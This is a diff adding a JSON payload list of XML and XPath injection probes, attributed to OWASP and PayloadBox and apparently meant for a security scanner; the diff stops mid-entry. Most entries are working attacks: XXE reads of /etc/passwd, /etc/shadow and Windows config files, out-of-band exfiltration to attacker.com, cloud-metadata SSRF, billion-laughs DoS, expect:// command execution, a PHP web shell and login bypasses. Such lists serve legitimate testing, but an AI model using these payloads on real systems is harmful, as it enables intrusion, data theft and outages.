@@ -1,0 +1,2333 @@
+[
+  {
+    "id": "xml-injection-owasp-0001",
+    "name": "Basic XML External Entity (XXE) Payloads",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "Basic XML External Entity (XXE) Payloads probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0002",
+    "name": "Basic XML External Entity (XXE) Payloads #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+    "description": "Basic XML External Entity (XXE) Payloads probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0003",
+    "name": "Basic XML External Entity (XXE) Payloads #3",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>",
+    "description": "Basic XML External Entity (XXE) Payloads probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0004",
+    "name": "XXE with Parameter Entities",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%xxe;'>\">%eval;%exfil;]><foo/>",
+    "description": "XXE with Parameter Entities probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0005",
+    "name": "XXE with Parameter Entities #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
+    "description": "XXE with Parameter Entities probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0006",
+    "name": "XXE via SVG Upload",
+    "template": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><text>&xxe;</text></svg>",
+    "description": "XXE via SVG Upload probe from OWASP. Tests application handling of: <svg xmlns=\"http://www.w3.org/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0007",
+    "name": "XXE via SOAP",
+    "template": "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
+    "description": "XXE via SOAP probe from OWASP. Tests application handling of: <soap:Envelope xmlns:soap=\"htt...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0008",
+    "name": "XXE Out-of-Band (OOB)",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><foo/>",
+    "description": "XXE Out-of-Band (OOB) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0009",
+    "name": "Blind XXE with Error-Based",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///nonexistent\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]><foo/>",
+    "description": "Blind XXE with Error-Based probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0010",
+    "name": "XXE with UTF-7",
+    "template": "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-?xml version=\"1.0\"?+AD4-<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE with UTF-7 probe from OWASP. Tests application handling of: <?xml version=\"1.0\" encoding=\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0011",
+    "name": "XML Billion Laughs Attack (DoS)",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">]><lolz>&lol9;</lolz>",
+    "description": "XML Billion Laughs Attack (DoS) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0012",
+    "name": "XXE with Base64 Encoding",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE with Base64 Encoding probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0013",
+    "name": "XXE via XInclude",
+    "template": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+    "description": "XXE via XInclude probe from OWASP. Tests application handling of: <foo xmlns:xi=\"http://www.w3.o...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0014",
+    "name": "XXE via XInclude #2",
+    "template": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"http://attacker.com/evil.txt\"/></foo>",
+    "description": "XXE via XInclude probe from OWASP. Tests application handling of: <foo xmlns:xi=\"http://www.w3.o...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0015",
+    "name": "XXE with Expect (PHP)",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "description": "XXE with Expect (PHP) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0016",
+    "name": "XXE with Expect (PHP) #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://ls\">]><foo>&xxe;</foo>",
+    "description": "XXE with Expect (PHP) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0017",
+    "name": "XXE with Data Protocol",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,SGVsbG8gV29ybGQ=\">]><foo>&xxe;</foo>",
+    "description": "XXE with Data Protocol probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0018",
+    "name": "XXE via DOCTYPE",
+    "template": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE via DOCTYPE probe from OWASP. Tests application handling of: <!DOCTYPE foo [<!ENTITY xxe SY...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0019",
+    "name": "XXE via DOCTYPE #2",
+    "template": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/payload\">]><foo>&xxe;</foo>",
+    "description": "XXE via DOCTYPE probe from OWASP. Tests application handling of: <!DOCTYPE foo [<!ENTITY xxe SY...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0020",
+    "name": "XXE Local File Inclusion (LFI)",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+    "description": "XXE Local File Inclusion (LFI) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0021",
+    "name": "XXE Local File Inclusion (LFI) #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "description": "XXE Local File Inclusion (LFI) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0022",
+    "name": "XXE Local File Inclusion (LFI) #3",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "description": "XXE Local File Inclusion (LFI) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0023",
+    "name": "XXE Local File Inclusion (LFI) #4",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\">]><foo>&xxe;</foo>",
+    "description": "XXE Local File Inclusion (LFI) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0024",
+    "name": "XXE for Windows",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
+    "description": "XXE for Windows probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0025",
+    "name": "XXE for Windows #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>",
+    "description": "XXE for Windows probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0026",
+    "name": "XXE for Windows #3",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/inetpub/wwwroot/web.config\">]><foo>&xxe;</foo>",
+    "description": "XXE for Windows probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0027",
+    "name": "XXE SSRF",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost/admin\">]><foo>&xxe;</foo>",
+    "description": "XXE SSRF probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0028",
+    "name": "XXE SSRF #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "description": "XXE SSRF probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0029",
+    "name": "XXE SSRF #3",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal.server/secret\">]><foo>&xxe;</foo>",
+    "description": "XXE SSRF probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0030",
+    "name": "XML Injection via CDATA",
+    "template": "<foo><![CDATA[<script>alert('XSS')</script>]]></foo>",
+    "description": "XML Injection via CDATA probe from OWASP. Tests application handling of: <foo><![CDATA[<script>alert('X...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0031",
+    "name": "XML Injection via CDATA #2",
+    "template": "<foo><![CDATA[<?php system($_GET['cmd']); ?>]]></foo>",
+    "description": "XML Injection via CDATA probe from OWASP. Tests application handling of: <foo><![CDATA[<?php system($_G...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0032",
+    "name": "XPath Injection",
+    "template": "' or '1'='1",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: ' or '1'='1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "xml-injection-payloads.txt, xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0033",
+    "name": "XPath Injection #2",
+    "template": "' or ''='",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: ' or ''='",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "xml-injection-payloads.txt, xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0034",
+    "name": "XPath Injection #3",
+    "template": "x' or 1=1 or 'x'='y",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: x' or 1=1 or 'x'='y",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "xml-injection-payloads.txt, xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0035",
+    "name": "XPath Injection #4",
+    "template": "admin' or '1'='1",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: admin' or '1'='1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "xml-injection-payloads.txt, xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0036",
+    "name": "XPath Injection #5",
+    "template": "'or 1=1--",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: 'or 1=1--",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0037",
+    "name": "XPath Injection #6",
+    "template": "' or 1=1#",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: ' or 1=1#",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0038",
+    "name": "XPath Injection #7",
+    "template": "admin'--",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: admin'--",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0039",
+    "name": "XPath Injection #8",
+    "template": "') or ('1'='1",
+    "description": "XPath Injection probe from OWASP. Tests application handling of: ') or ('1'='1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "xml-injection-payloads.txt, xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0040",
+    "name": "SOAP XML Injection",
+    "template": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><login><username>admin' or '1'='1</username><password>anything</password></login></soapenv:Body></soapenv:Envelope>",
+    "description": "SOAP XML Injection probe from OWASP. Tests application handling of: <soapenv:Envelope xmlns:soapen...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0041",
+    "name": "XML Bomb Variants",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE bomb [<!ENTITY a \"aaaaaaaaaa\" ><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;\"><!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;\"><!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;\">]><bomb>&e;</bomb>",
+    "description": "XML Bomb Variants probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0042",
+    "name": "Encoded XXE Payloads",
+    "template": "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+    "description": "Encoded XXE Payloads probe from OWASP. Tests application handling of: %3C%3Fxml%20version%3D%221.0%2...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0043",
+    "name": "XXE via RSS Feed",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><rss><channel><title>&xxe;</title></channel></rss>",
+    "description": "XXE via RSS Feed probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0044",
+    "name": "XXE via XML Sitemap",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE urlset [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><urlset><url><loc>&xxe;</loc></url></urlset>",
+    "description": "XXE via XML Sitemap probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0045",
+    "name": "XXE with Public and System Identifiers",
+    "template": "<!DOCTYPE foo PUBLIC \"any_text\" \"http://attacker.com/evil.dtd\">",
+    "description": "XXE with Public and System Identifiers probe from OWASP. Tests application handling of: <!DOCTYPE foo PUBLIC \"any_text...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0046",
+    "name": "XXE with Public and System Identifiers #2",
+    "template": "<!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\">",
+    "description": "XXE with Public and System Identifiers probe from OWASP. Tests application handling of: <!DOCTYPE foo SYSTEM \"http://a...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0047",
+    "name": "XXE Exfiltration via FTP",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"ftp://attacker.com/evil.dtd\">%dtd;]><foo/>",
+    "description": "XXE Exfiltration via FTP probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0048",
+    "name": "XXE with UTF-16",
+    "template": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE with UTF-16 probe from OWASP. Tests application handling of: <?xml version=\"1.0\" encoding=\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0049",
+    "name": "Java-specific XXE",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "Java-specific XXE probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0050",
+    "name": "Java-specific XXE #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///path/to/jar!/resource\">]><foo>&xxe;</foo>",
+    "description": "Java-specific XXE probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0051",
+    "name": "XXE via XForms",
+    "template": "<html xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:xf=\"http://www.w3.org/2002/xforms\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><xf:model><xf:instance><data>&xxe;</data></xf:instance></xf:model></html>",
+    "description": "XXE via XForms probe from OWASP. Tests application handling of: <html xmlns=\"http://www.w3.org...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0052",
+    "name": "Nested Entity Attacks",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY outer \"<!ENTITY inner SYSTEM 'file:///etc/passwd'>\">]><foo>&outer;&inner;</foo>",
+    "description": "Nested Entity Attacks probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0053",
+    "name": "XXE Filter Bypass",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:////etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE Filter Bypass probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0054",
+    "name": "XXE Filter Bypass #2",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"fiLe:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE Filter Bypass probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0055",
+    "name": "XXE Filter Bypass #3",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"FILE:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE Filter Bypass probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0056",
+    "name": "XML Attribute Injection",
+    "template": "<user id=\"1' or '1'='1\"/>",
+    "description": "XML Attribute Injection probe from OWASP. Tests application handling of: <user id=\"1' or '1'='1\"/>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0057",
+    "name": "XML Attribute Injection #2",
+    "template": "<user id=\"1\"><name>admin'--</name></user>",
+    "description": "XML Attribute Injection probe from OWASP. Tests application handling of: <user id=\"1\"><name>admin'--</n...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0058",
+    "name": "XSLT Injection",
+    "template": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"document('file:///etc/passwd')\"/></xsl:template></xsl:stylesheet>",
+    "description": "XSLT Injection probe from OWASP. Tests application handling of: <xsl:stylesheet version=\"1.0\" ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0059",
+    "name": "SVG XXE Advanced",
+    "template": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><text x=\"0\" y=\"15\">&xxe;</text></svg>",
+    "description": "SVG XXE Advanced probe from OWASP. Tests application handling of: <?xml version=\"1.0\" standalone...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0060",
+    "name": "Office Document XXE (DOCX, XLSX, etc)",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><doc>&xxe;</doc>",
+    "description": "Office Document XXE (DOCX, XLSX, etc) probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-owasp-0061",
+    "name": "XXE via PDF Upload",
+    "template": "<?xml version=\"1.0\"?><!DOCTYPE pdf [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><pdf>&xxe;</pdf>",
+    "description": "XXE via PDF Upload probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?><!DOCTYPE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "xml-injection-payloads.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0001",
+    "name": "Xpath Injection #1",
+    "template": "'",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0002",
+    "name": "Xpath Injection #2",
+    "template": "''",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ''",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0003",
+    "name": "Xpath Injection #3",
+    "template": "\"",
